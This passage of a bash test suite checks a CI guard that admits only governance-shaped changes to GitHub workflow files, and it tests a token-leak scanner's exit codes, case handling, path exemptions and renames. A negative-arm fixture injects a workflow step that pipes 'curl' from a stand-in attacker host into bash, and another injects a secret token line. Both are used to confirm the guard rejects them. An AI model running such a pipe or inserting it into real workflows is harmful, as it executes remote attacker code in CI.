  assert_true "AC10b cycle-2 positive arm: a brand-new select step carrying the EXACT shipped capture-then-check body is fully admitted (got $SELECT_BODY_POSITIVE_UNRECOGNIZED unrecognized line(s))" \
    "[ \"$SELECT_BODY_POSITIVE_UNRECOGNIZED\" -eq 0 ]"

  SELECT_BODY_NEGATIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
index 0000000..1111111 100644
--- a/.github/workflows/fixture.yml
+++ b/.github/workflows/fixture.yml
@@ -1,2 +1,5 @@
       - name: Checkout
+      - id: select
+        name: select suites for this change
+        run: |
+          curl -s https://evil.example/x | bash'
  SELECT_BODY_NEGATIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$SELECT_BODY_NEGATIVE_DIFF" | grep -c .)"
  assert_true "AC10b cycle-2 negative arm: a non-governance line (an injected curl|bash pipe) inside a NEW select step's run: body is NOT admitted -- the hole the cycle-1 blanket block-scope admission left open (got $SELECT_BODY_NEGATIVE_UNRECOGNIZED unrecognized line(s))" \
    "[ \"$SELECT_BODY_NEGATIVE_UNRECOGNIZED\" -gt 0 ]"

  CHECKOUT_FETCH_DEPTH_POSITIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
index 0000000..1111111 100644
--- a/.github/workflows/fixture.yml
+++ b/.github/workflows/fixture.yml
@@ -1,2 +1,4 @@
       - name: Checkout
         uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+        with:
+          fetch-depth: 0'
  CHECKOUT_FETCH_DEPTH_POSITIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$CHECKOUT_FETCH_DEPTH_POSITIVE_DIFF" | grep -c .)"
  assert_true "AC10b cycle-2 positive arm: a checkout step's OWN with: block carrying fetch-depth: 0 is admitted (got $CHECKOUT_FETCH_DEPTH_POSITIVE_UNRECOGNIZED unrecognized line(s))" \
    "[ \"$CHECKOUT_FETCH_DEPTH_POSITIVE_UNRECOGNIZED\" -eq 0 ]"

  CHECKOUT_FETCH_DEPTH_NEGATIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
index 0000000..1111111 100644
--- a/.github/workflows/fixture.yml
+++ b/.github/workflows/fixture.yml
@@ -1,2 +1,4 @@
       - name: Checkout
         uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+        with:
+          token: ${{ secrets.INJECTED_TOKEN }}'
  CHECKOUT_FETCH_DEPTH_NEGATIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$CHECKOUT_FETCH_DEPTH_NEGATIVE_DIFF" | grep -c .)"
  assert_true "AC10b cycle-2 negative arm: a non-governance checkout key (an injected with: token:) is NOT admitted -- the with: opener alone is admitted, its content is checked (got $CHECKOUT_FETCH_DEPTH_NEGATIVE_UNRECOGNIZED unrecognized line(s))" \
    "[ \"$CHECKOUT_FETCH_DEPTH_NEGATIVE_UNRECOGNIZED\" -gt 0 ]"

  # GATE:QUALITY quality-deduction finding: the classifier's paths: glob-item
  # admission (`^- '...'$`) must be scoped to a paths: block's own YAML
  # context, not admitted file-wide. Negative arm: the same quoted-string
  # shape appears as a list item OUTSIDE any paths: block (a `steps:` list
  # entry, not a trigger glob) and must stay unrecognized.
  PATHS_SCOPE_NEGATIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
index 0000000..1111111 100644
--- a/.github/workflows/fixture.yml
+++ b/.github/workflows/fixture.yml
@@ -1,2 +1,3 @@
     steps:
+      - '"'"'not-a-paths-glob-injected-here'"'"''
  PATHS_SCOPE_NEGATIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$PATHS_SCOPE_NEGATIVE_DIFF" | grep -c .)"
  assert_true "AC10b classifier breadth negative arm: a quoted-string list item OUTSIDE any paths: block (under steps:, not a trigger glob) is NOT admitted (got $PATHS_SCOPE_NEGATIVE_UNRECOGNIZED unrecognized line(s))" \
    "[ \"$PATHS_SCOPE_NEGATIVE_UNRECOGNIZED\" -gt 0 ]"

  # Positive counterpart: the SAME quoted-string list-item shape, appended
  # INSIDE a paths: block, IS admitted -- confirms the tightened classifier
  # did not lose the legitimate append it exists to allow.
  PATHS_SCOPE_POSITIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
index 0000000..1111111 100644
--- a/.github/workflows/fixture.yml
+++ b/.github/workflows/fixture.yml
@@ -1,3 +1,4 @@
     paths:
      - '"'"'tests/existing-glob.sh'"'"'
+      - '"'"'tests/newly-appended-glob.sh'"'"''
  PATHS_SCOPE_POSITIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$PATHS_SCOPE_POSITIVE_DIFF" | grep -c .)"
  assert_true "AC10b classifier breadth positive arm: a quoted-string list item appended INSIDE a paths: block is still admitted (got $PATHS_SCOPE_POSITIVE_UNRECOGNIZED unrecognized line(s))" \
    "[ \"$PATHS_SCOPE_POSITIVE_UNRECOGNIZED\" -eq 0 ]"

  # #985 AC3-SPDX-COVERAGE (every tracked .yml gains a 2-line inline SPDX
  # header) and #103's governance-only edit (select step / per-suite id+if+
  # timeout-minutes guard / reconciliation step, on suite steps only — see
  # .autoflow/issue-103-gate-plan.md F2 and
  # scripts/test/suite-manifest.sh:315) are both admitted on the two CI
  # runner YAMLs, by the same no-deletions / all-added-lines-recognized
  # shape as AC10a's #843 parity-carry exception. Any other change to these
  # files stays caught.
  # --unified=100000: the block-scope tracker in
  # unrecognized_added_lines_in_diff() (paths:, the checkout step's with:,
  # the select step's body) opens each block off an OPENER LINE it must see
  # in the diff STREAM, context or added. Git's default 3-line context can
  # leave that opener out of the hunk entirely when the insertion sits far
  # from it (e.g. a new paths: glob appended after many pre-existing
  # entries) -- the block never opens and a legitimately-shaped addition
  # reads as unrecognized. Full-file context makes every opener visible
  # regardless of list length; it changes nothing the classifier admits,
  # only whether the lines it already knows how to admit are present to
  # check (cycle-3 fact: AC10b reds on schema-hook-contract.yml's paths:
  # append at b1513c0 without this).
  wf_diff="$(git -C "$PROJECT_ROOT" diff --unified=100000 "$base_ref"..HEAD -- \
    .github/workflows/workflow-regression.yml .github/workflows/schema-hook-contract.yml 2>/dev/null)"
  wf_untouched="no"; [[ -z "$wf_diff" ]] && wf_untouched="yes"
  wf_change_admitted="no"
  if [[ "$wf_untouched" == "yes" ]]; then
    wf_change_admitted="yes"
  else
    wf_deleted_lines="$(printf '%s\n' "$wf_diff" | grep -c '^-[^-]')"
    wf_added_other="$(unrecognized_added_lines_in_diff "$wf_diff" | grep -c . || true)"
    if [[ "$wf_deleted_lines" -eq 0 && "$wf_added_other" -eq 0 ]]; then
      wf_change_admitted="yes"
    fi
  fi
  assert_eq "AC10b: existing CI runner YAMLs untouched vs origin/main, OR changed with an SPDX-header-only diff (#985 AC3-SPDX-COVERAGE) and/or a governance-only diff (#103 select/guard-shape/reconciliation on suite steps)" \
    "yes" "$wf_change_admitted"
fi

# =============================================================================
echo ""
echo "=== AC11: exit-code triad (0 clean / 1 leaks / 2 usage-or-env error) ==="

repo="$(make_temp_repo)"
write_file "$repo" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo" "base"
base_sha="$(git -C "$repo" rev-parse HEAD)"
append_line "$repo" "scripts/foo.sh" 'echo "clean addition, no token"'
commit_all "$repo" "clean addition"
run_guard "$repo" --base "$base_sha" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC11a: exit 0 on a clean diff" "0" "$GUARD_EXIT"

repo2="$(make_temp_repo)"
write_file "$repo2" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo2" "base"
base_sha2="$(git -C "$repo2" rev-parse HEAD)"
append_line "$repo2" "scripts/foo.sh" 'echo "librechat leak one"'
append_line "$repo2" "scripts/foo.sh" 'echo "cbnu leak two"'
commit_all "$repo2" "multi-leak commit"
run_guard "$repo2" --base "$base_sha2" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC11b: exit 1 on multi-leak commit" "1" "$GUARD_EXIT"
assert_contains "AC11c: multi-leak — first leak listed (librechat)" "$GUARD_STDERR" "token 'librechat'"
assert_contains "AC11d: multi-leak — second leak also listed (cbnu)" "$GUARD_STDERR" "token 'cbnu'"

repo3="$(make_temp_repo)"
write_file "$repo3" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo3" "base"
run_guard "$repo3" --base "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC11e: exit 2 on unresolvable --base ref" "2" "$GUARD_EXIT"

repo4="$(make_temp_repo)"
write_file "$repo4" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo4" "base"
run_guard "$repo4" --bogus-flag --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC11f: exit 2 on unknown flag" "2" "$GUARD_EXIT"

# =============================================================================
echo ""
echo "=== AC12: case-insensitive match ==="

repo="$(make_temp_repo)"
write_file "$repo" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo" "base"
base_sha="$(git -C "$repo" rev-parse HEAD)"
append_line "$repo" "scripts/foo.sh" 'echo "LibreChat mixed case"'
commit_all "$repo" "mixed-case leak"
run_guard "$repo" --base "$base_sha" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC12a: mixed-case 'LibreChat' trips the guard (exit 1)" "1" "$GUARD_EXIT"

repo2="$(make_temp_repo)"
write_file "$repo2" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo2" "base"
base_sha2="$(git -C "$repo2" rev-parse HEAD)"
append_line "$repo2" "scripts/foo.sh" 'echo "LIBRECHAT upper case"'
commit_all "$repo2" "upper-case leak"
run_guard "$repo2" --base "$base_sha2" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC12b: upper-case 'LIBRECHAT' trips the guard (exit 1)" "1" "$GUARD_EXIT"

# =============================================================================
echo ""
echo "=== AC13: pending-MOVE exemption (decoupling-plan §10) ==="

repo="$(make_temp_repo)"
write_file "$repo" "scripts/webhook/handler.sh" "$BASE_HOST_FILE_CONTENT"
write_file "$repo" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo" "base"
base_sha="$(git -C "$repo" rev-parse HEAD)"
append_line "$repo" "scripts/webhook/handler.sh" 'echo "librechat move-tier"'
append_line "$repo" "scripts/foo.sh" 'echo "librechat non-exempt leak"'
commit_all "$repo" "MOVE-tier + non-exempt leak, same commit"
run_guard "$repo" --base "$base_sha" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC13a: exit 1 — non-exempt leak still flagged" "1" "$GUARD_EXIT"
assert_contains "AC13b: scripts/foo.sh leak reported" "$GUARD_STDERR" "scripts/foo.sh"
assert_not_contains "AC13c: scripts/webhook/handler.sh NOT reported (MOVE exemption)" \
  "$GUARD_STDERR" "scripts/webhook/handler.sh"

repo2="$(make_temp_repo)"
write_file "$repo2" "scripts/webhook/handler2.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo2" "base"
base_sha2="$(git -C "$repo2" rev-parse HEAD)"
append_line "$repo2" "scripts/webhook/handler2.sh" 'echo "portone move-tier only"'
commit_all "$repo2" "pure MOVE-tier commit"
run_guard "$repo2" --base "$base_sha2" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC13d: exit 0 — a pure-MOVE-path commit is clean" "0" "$GUARD_EXIT"

allow_lines=""
[[ -f "$PATHS_FILE" ]] && allow_lines="$(grep -E '^allow' "$PATHS_FILE" 2>/dev/null || true)"
assert_contains "AC13e: config allows scripts/webhook/** (MOVE tier)" "$allow_lines" "allow scripts/webhook/**"
# AC13f (decoupling-plan §10 cross-check) removed: docs/host-service-decoupling-plan.md
# was deleted by the ratified GATE:PLAN public-release doc sweep (Issue #985);
# the MOVE-tier allowlist is now cross-checked structurally via AC13e/AC5 only.

# =============================================================================
echo ""
echo "=== AC14: rename edge — pre-existing token survives a pure rename ==="

repo="$(make_temp_repo)"
write_file "$repo" "a.sh" "${BASE_HOST_FILE_CONTENT}echo \"librechat pre-existing\"\n"
commit_all "$repo" "base with token in a.sh"
base_sha="$(git -C "$repo" rev-parse HEAD)"
git -C "$repo" mv a.sh b.sh
commit_all "$repo" "pure rename, no content change"
run_guard "$repo" --base "$base_sha" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC14: exit 0 — rename of a pre-existing-token file is not an introduction" "0" "$GUARD_EXIT"

# ---------------------------------------------------------------------------
# Results
# ---------------------------------------------------------------------------
echo ""
echo "=============================="
echo "Results: $PASS/$TESTS passed, $FAIL failed, $SKIP skipped"
echo "=============================="

[[ $FAIL -gt 0 ]] && exit 1
exit 0
